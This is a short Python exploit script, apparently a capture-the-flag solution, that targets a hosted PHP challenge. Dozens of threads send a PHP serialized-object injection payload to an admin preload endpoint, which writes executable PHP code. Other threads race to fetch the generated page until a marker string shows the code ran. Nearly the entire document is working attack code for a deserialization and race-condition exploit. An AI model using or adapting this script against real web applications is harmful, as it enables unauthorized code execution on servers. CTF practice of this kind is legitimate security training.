import io
import requests
import threading


def write(session):
    while True:
        resp = session.post('http://eci-2zehk6qgv7x3nlpw8m3k.cloudeci1.ichunqiu.com/admin/preload.php', data={
            'a': 'O:7:"preload":3:{s:5:"class";N;s:8:"contents";s:35:"new hacker();phpinfo();echo \'xenny\'?>";s:6:"method";N;}'},
                            cookies={'PHPSESSID': 'mt2c60k1mv9b5f8qivr0kujgg6'})


def read(session):
    while True:
        resp = session.get('http://eci-2zehk6qgv7x3nlpw8m3k.cloudeci1.ichunqiu.com/admin/hack.php',
                           cookies={'PHPSESSID': 'mt2c60k1mv9b5f8qivr0kujgg6'})
        if 'xenny' in resp.text:
            print(resp.text)
            event.clear()


if __name__ == "__main__":
    event = threading.Event()
    with requests.session() as session:
        for i in range(1, 30):
            threading.Thread(target=write, args=(session,)).start()
        for i in range(1, 30):
            threading.Thread(target=read, args=(session,)).start()
    event.set()
